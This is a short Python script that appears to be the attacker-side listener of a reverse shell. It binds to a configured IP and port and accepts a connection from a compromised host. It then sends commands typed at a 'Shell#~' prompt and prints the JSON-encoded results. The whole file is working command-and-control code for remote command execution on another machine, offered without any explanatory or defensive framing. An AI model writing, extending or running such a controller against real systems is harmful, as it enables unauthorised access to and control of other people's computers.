#! /usr/bin/python

import socket
import json
from termcolor import colored

from ip_cred import IP, PORT

def reliable_send(data):
	json_data = json.dumps(data)
	target.send(json_data.encode("utf-8"))

def reliable_recv():
	data = ""
	while True:
		try:
			data = data + target.recv(1024).decode("utf-8")
			return json.loads(data)
		except ValueError:
			continue
def shell():
	while True:
		command = input("[*] Shell#~%s: " % str(ip))
		reliable_send(command)
		if command == "q":
			break
		else:
			result = reliable_recv() # prints result of the command
			print(result)

def runServer():
	global s
	global ip
	global target
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	s.bind((IP, PORT))
	s.listen(5)

	print(colored("[+] Listening for incomig connections", "green"))

	target, ip = s.accept()
	print(colored("[+] Connection established from %s" % str(ip), "green"))

runServer()
shell()
s.close()



